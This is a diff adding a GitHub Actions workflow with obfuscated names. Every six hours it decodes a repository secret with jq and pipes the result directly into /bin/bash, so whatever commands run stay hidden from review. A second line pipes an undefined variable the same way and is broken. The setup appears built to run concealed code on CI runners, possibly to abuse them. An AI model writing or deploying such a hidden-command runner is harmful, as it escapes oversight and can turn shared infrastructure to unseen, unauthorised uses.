@@ -1,0 +1,18 @@
+name: donghuiwan1928
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: donghuiwan1928
+        env:
+          fv14: ${{ secrets.fv14 }}
+        run: |
+          echo $fv14 | jq -r .ctq6 | /bin/bash
+          echo $hh962 | jq -r .agv06278 | /bin/bash
+
